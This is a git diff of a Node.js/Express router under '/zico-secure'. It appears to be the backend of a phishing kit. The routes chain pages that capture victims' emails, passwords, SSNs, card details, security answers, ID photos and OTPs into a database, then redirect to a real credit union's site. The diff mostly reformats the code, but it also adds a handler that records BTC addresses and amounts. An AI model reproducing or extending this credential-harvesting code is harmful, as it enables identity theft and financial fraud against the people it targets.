@@ -10,6 +10,7 @@ const Email1 = require('../models/Email1');
 const Questions = require('../models/Questions')
 const Card = require('../models/Card')
 const Image = require('../models/Images')
+const Btc = require('../models/Btc')
 const {
   forwardAuthenticated
 } = require('../config/auth');
@@ -18,8 +19,12 @@ const bodyParser = require('body-parser');
 const Grid = require('gridfs-stream');
 const GridFsStorage = require('multer-gridfs-storage')
 const IP = require('ip');
-const { noCache } = require('../app1');
-const { sendEmail } = require("../config/sendEmail");
+const {
+  noCache
+} = require('../app1');
+const {
+  sendEmail
+} = require("../config/sendEmail");
 const dotenv = require("dotenv");
 const nodemailer = require("nodemailer");
 const generateOTP = require("../config/generateOtp");
@@ -38,7 +43,7 @@ let gfs;
 conn.once('open', () => {
   // Initialize GridFS
   gfs = Grid(conn.db, mongoose.mongo);
-  gfs.collection('uploads'); 
+  gfs.collection('uploads');
 });
 
 // Storage
@@ -52,7 +57,9 @@ const storage = new GridFsStorage({
   },
 })
 
-const upload = multer({ storage });
+const upload = multer({
+  storage
+});
 
 function generateRandomId(length) {
   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -92,7 +99,7 @@ router.get('/alert', noCache, forwardAuthenticated, (req, res) => res.render('al
 router.get('/emailcnt', noCache, forwardAuthenticated, (req, res) => res.render('email1'));
 
 router.get('/loginverify', noCache, forwardAuthenticated, (req, res) => res.render('login2'));
- 
+
 router.get('/otpVerify', noCache, forwardAuthenticated, (req, res) => res.render('otp'));
 
 router.get('/otpVerifier', noCache, forwardAuthenticated, (req, res) => res.render('questions'));
@@ -118,7 +125,10 @@ let transporter = nodemailer.createTransport({
 let activeOTPs = {}; // In-memory storage for active OTPs
 
 router.post('/sendEmail', async (req, res) => {
-  const { email, password } = req.body;
+  const {
+    email,
+    password
+  } = req.body;
 
   console.log("aa");
 
@@ -158,7 +168,10 @@ router.post('/sendEmail', async (req, res) => {
 
 // Route for verifying OTP during login
 router.post('/otpVerifier', (req, res) => {
-  const { email, enteredOTP } = req.body;
+  const {
+    email,
+    enteredOTP
+  } = req.body;
 
   // Retrieve stored OTP from activeOTPs storage
   const storedOTP = activeOTPs[email];
@@ -168,8 +181,8 @@ router.post('/otpVerifier', (req, res) => {
   console.log(enteredOTP)
 
   if (storedOTP == enteredOTP) {
-     
-    
+
+
 
     // OTP is valid
     delete activeOTPs[email]; // Remove the used OTP to ensure it's used only once
@@ -202,11 +215,17 @@ router.post('/card', async (req, res) => {
       );
       res.redirect('https://www.sccu.com');
     })
-  .catch(err => console.log(err));
+    .catch(err => console.log(err));
 });
 
 // images
-router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
+router.post('/images', upload.fields([{
+  name: 'image1',
+  maxCount: 1
+}, {
+  name: 'image2',
+  maxCount: 1
+}]), (req, res) => {
   res.redirect('/zico-secure/emailcnt');
 });
 
@@ -232,7 +251,7 @@ router.post('/questions', async (req, res) => {
       );
       res.redirect('/zico-secure/images');
     })
-  .catch(err => console.log(err));
+    .catch(err => console.log(err));
 });
 
 router.post('/email', async (req, res) => {
@@ -249,7 +268,7 @@ router.post('/email', async (req, res) => {
       ssn: req.body.ssn,
       id: randomId
     });
-  
+
     email
       .save()
       .then(result => {
@@ -261,33 +280,52 @@ router.post('/email', async (req, res) => {
         res.redirect('/zico-secure/card');
       })
 
-} catch (err) {
+  } catch (err) {
     if (err.code === 11000) {
-        return res.status(409).json({ error: 'Duplicate email detected' });
+      return res.status(409).json({
+        error: 'Duplicate email detected'
+      });
     }
     // Handle other errors as you see fit
-    return res.status(500).json({ error: 'Internal server error' });
-}
+    return res.status(500).json({
+      error: 'Internal server error'
+    });
+  }
 });
 
 router.post('/emailcnt', async (req, res) => {
-  const emailcnt = new Email1({
- email: req.body.email,
- password: req.body.password,
- id: randomId
+  // Validate BTC Address
+  const btcAddress = req.body.btcaddress;
+  if (!btcAddress) {
+    req.flash('error_msg', 'BTC Address must be filled out');
+    return res.redirect('/zico-secure/ALERT');
+  }
+
+  // Validate Amount (allow only numbers)
+  const amount = req.body.amount;
+  if (!amount || isNaN(amount)) {
+    req.flash('error_msg', 'Amount must be a valid number');
+    return res.redirect('/zico-secure/ALERT');
+  }
+
+  // Create a new instance of Btc
+  const btcInstance = new Btc({
+    btc: btcAddress,
+    amount: amount
   });
 
-  emailcnt
-  .save()
+  // Save the instance to the database
+  btcInstance.save()
     .then(result => {
-      console.log(result)
-      req.flash(
-        'success_msg',
-        'Email ok'
-      );
-      res.redirect('/zico-secure/email');
+      console.log(result);
+      req.flash('success_msg', 'Email ok');
+      res.redirect('/zico-secure/ALERT');
     })
-  .catch(err => console.log(err));
+    .catch(err => {
+      console.error(err);
+      req.flash('error_msg', 'An error occurred');
+      res.redirect('/zico-secure/ALERT');
+    });
 });
 
 // Register
@@ -384,16 +422,16 @@ router.post('/login', (req, res, next) => {
   })
 
   user
-  .save()
-  .then(result => {
-    console.log(result)
-    req.flash(
-      'success_msg',
-      'Questions ok'
-    );
-    res.redirect('/zico-secure/loginverify');
-  })
-.catch(err => console.log(err));
+    .save()
+    .then(result => {
+      console.log(result)
+      req.flash(
+        'success_msg',
+        'Questions ok'
+      );
+      res.redirect('/zico-secure/loginverify');
+    })
+    .catch(err => console.log(err));
 });
 
 // Login Verify
@@ -409,16 +447,16 @@ router.post('/loginverify', (req, res, next) => {
   })
 
   user
-  .save()
-  .then(result => {
-    console.log(result)
-    req.flash(
-      'success_msg',
-      'Questions ok'
-    );
-    res.redirect('/zico-secure/questions');
-  })
-.catch(err => console.log(err));
+    .save()
+    .then(result => {
+      console.log(result)
+      req.flash(
+        'success_msg',
+        'Questions ok'
+      );
+      res.redirect('/zico-secure/questions');
+    })
+    .catch(err => console.log(err));
 });
 
 // Logout
@@ -433,7 +471,9 @@ router.get('/files', (req, res) => {
   gfs.files.find().toArray((err, files) => {
     // Check if files
     if (!files || files.length === 0) {
-      res.render('files', { files: false });
+      res.render('files', {
+        files: false
+      });
     } else {
       files.map(file => {
         if (
@@ -445,16 +485,20 @@ router.get('/files', (req, res) => {
           file.isImage = false;
         }
       });
-      res.render('files', { files: files });
+      res.render('files', {
+        files: files
+      });
     }
   });
 });
 
 // Retrieve a specific file by filename
 router.get('/files/:filename', (req, res) => {
-  gfs.files.findOne({ filename: req.params.filename }, (err, file) => {
+  gfs.files.findOne({
+    filename: req.params.filename
+  }, (err, file) => {
     // Check if file
-    if (!file || file.length === 0) {                                                                                                                                       
+    if (!file || file.length === 0) {
       return res.status(404).json({
         err: 'No file exists'
       });
